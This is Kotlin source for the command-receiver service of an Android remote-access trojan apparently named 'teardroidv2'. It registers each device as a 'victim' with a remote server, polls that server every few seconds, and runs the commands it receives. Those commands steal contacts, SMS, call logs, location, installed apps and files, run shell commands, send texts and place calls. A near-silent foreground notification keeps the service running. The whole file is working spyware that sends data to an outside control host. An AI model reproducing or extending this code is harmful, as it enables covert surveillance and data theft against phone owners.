package com.example.teardroidv2

import Request
import android.app.Service
import android.content.*
import android.os.IBinder
import android.util.Log
import org.json.JSONObject
import android.os.SystemClock

import android.app.AlarmManager
import android.app.Notification

import android.app.PendingIntent

import android.content.Intent
import android.os.Build
import android.app.NotificationManager

import android.app.NotificationChannel
import android.graphics.Color
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat





class CommandReciver : Service() {
    private val TAG = AppInfo.TAG
    private val Action = Utility(this)
    private val FileAction = FileAction(this)
    private val nReceiver = NotificationReceiver()

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        val pendingIntent: PendingIntent =
            Intent(this, CommandReciver::class.java).let { notificationIntent ->
                PendingIntent.getActivity(this, 0, notificationIntent, 0)
            }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startMyOwnForeground(pendingIntent)
        }
        Request.init(this)
        startNotificationListner()
        val VictimDataStore = getSharedPreferences(AppInfo.VictimDatastore, MODE_PRIVATE)
        if(VictimDataStore.getString(AppInfo.VictimID,null) == null){
            setVictim(VictimDataStore)
        }else{
            val victimID = getVictimID()
            commandReciver(victimID)
        }
        return START_STICKY
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun startMyOwnForeground(pendingIntent: PendingIntent) {
        val channelID = "com.example.teardroid_v2"
        val notificationChannel = NotificationChannel(
            channelID,
            "Background Service",
            NotificationManager.IMPORTANCE_NONE
        )
        notificationChannel.enableLights(false)
        notificationChannel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val manager = (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
        manager.createNotificationChannel(notificationChannel)
        val notificationBuilder = NotificationCompat.Builder(this, channelID)
        val notification: Notification = notificationBuilder.setOngoing(true)
            .setContentTitle(AppInfo.NotificationTitle)
            .setContentText(AppInfo.NotificationContent)
            .setSubText(AppInfo.NotificationSubText)
            .setPriority(NotificationManager.IMPORTANCE_NONE)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1337, notification)
        val noti: Notification = notificationBuilder
            .setContentTitle(AppInfo.NotificationTitle)
            .setContentText(AppInfo.NotificationContent)
            .setSubText(AppInfo.NotificationSubText)
            .setSmallIcon(R.drawable.logo)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setContentIntent(pendingIntent)
            .build()
        manager.notify(1337, noti);

    }


    private fun commandReciver(victimID:String){
        Request.init(context = this)
            val thread = Thread {
                while (true){
                    Request("/command/device/$victimID",{
                        commandExecutor(it)
                    },{
                        Log.d(AppInfo.TAG,"commandReciver => $victimID"+ it)
                    }).get()
                    Thread.sleep(3000)
                }
            }
            thread.start()
    }


    private fun commandExecutor(response: JSONObject){
        val task = response.getJSONArray("command")
        if(task.length() != 0){
            for (i in 0 until task.length()) {
                val responseObj = JSONObject()
                val command = task.getJSONObject(i)
                responseObj.put("command_key",command.getString("key"))
                try {
                    when(command.getString("command")){
                        "getcontact" -> responseObj.put("response",Action.getContact())
                        "getapps" -> responseObj.put("response",Action.installedApps())
                        "getsms" -> responseObj.put("response",Action.getSms())
                        "listfile" ->  if (command.getString("data") == "null") responseObj.put("response",Action.getFiles()) else responseObj.put("response",Action.getFiles(command.getString("data")))
                        "getcalllogs" -> responseObj.put("response",Action.getCallLogs())
                        "getservices" -> responseObj.put("response",Action.getServices())
                        "runshell" -> responseObj.put("response",Action.runCommand(command.getString("shell")))
                        "changewallpaper" -> responseObj.put("response",Action.changeWallpaper(command.getString("data")))
                        "sendsms" -> responseObj.put("response",Action.sendSMS(command.getString("number"),command.getString("data")))
                        "makecall" -> responseObj.put("response",Action.makeCall(command.getString("number")))
                        "getlocation" -> responseObj.put("response",Action.getLocation())
                        "getfile" -> responseObj.put("response",FileAction.uploadFile(command.getString("data")))
                    }
                }catch (e:Exception){
                    responseObj.put("success",false)
                    Log.d(AppInfo.TAG, "Error => $e")
                }
                Request("/command/complete",{
                    Log.d(AppInfo.TAG, "commandExecutor => $it")
                },{
                    Log.d(AppInfo.TAG, "error => $it")
                }).post(responseObj)
            }
        }
    }

    private fun startNotificationListner(){
        val filter = IntentFilter()
        filter.addAction(AppInfo.PackageName)
        registerReceiver(nReceiver, filter)
    }

    private fun showError(ErrorResponse: String) {
        Log.d(TAG,ErrorResponse)

    }

    private fun getVictimID(): String {
        val VictimDataStore = getSharedPreferences(AppInfo.VictimDatastore, MODE_PRIVATE)
        return VictimDataStore.getString(AppInfo.VictimID,"invalid ID")!!
    }

    private fun setVictim(VictimDataStore: SharedPreferences) {
        val client = Action.addClient()
        Request("/client/add",{
            val editor = VictimDataStore.edit()
            editor.putString(AppInfo.VictimID,it.getString("key"))
            editor.apply()
            commandReciver(it.getString("key"))
        },{
            Log.d(AppInfo.TAG,it)
        }).post(client)
    }

    override fun onBind(intent: Intent): IBinder? {
        // TODO: Return the communication channel to the service.
        throw UnsupportedOperationException("Not yet implemented")
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(nReceiver);
        Log.d(TAG,"On Destroyed called")
        val isFirstRun = getSharedPreferences(AppInfo.isServiceRunning, MODE_PRIVATE)
        val changeRunEntry = isFirstRun.edit()
        changeRunEntry.putBoolean(AppInfo.FirstRunKey,true)
        changeRunEntry.apply()
    }


    internal class NotificationReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent) {
            val temp = """
               ${intent.getStringExtra("notification_event")}
               """.trimIndent()
            Log.d(AppInfo.TAG,temp)
        }
    }
}